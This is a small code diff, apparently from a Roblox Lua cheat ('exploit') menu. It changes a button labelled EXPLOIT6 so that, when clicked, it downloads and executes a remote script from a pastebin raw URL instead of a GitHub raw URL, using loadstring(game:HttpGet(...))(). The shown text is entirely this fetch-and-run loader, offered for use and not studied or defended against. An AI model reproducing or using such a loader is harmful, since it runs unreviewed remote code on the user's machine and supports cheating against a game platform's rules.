@@ -342,7 +342,7 @@ EXPLOIT6.TextScaled = true
 EXPLOIT6.TextSize = 14.000
 EXPLOIT6.TextWrapped = true
 EXPLOIT6.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Quan8008/ok/main/Oki"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/GPiMNxZi"))()
 end)
 
 UICorner_16.Parent = EXPLOIT6
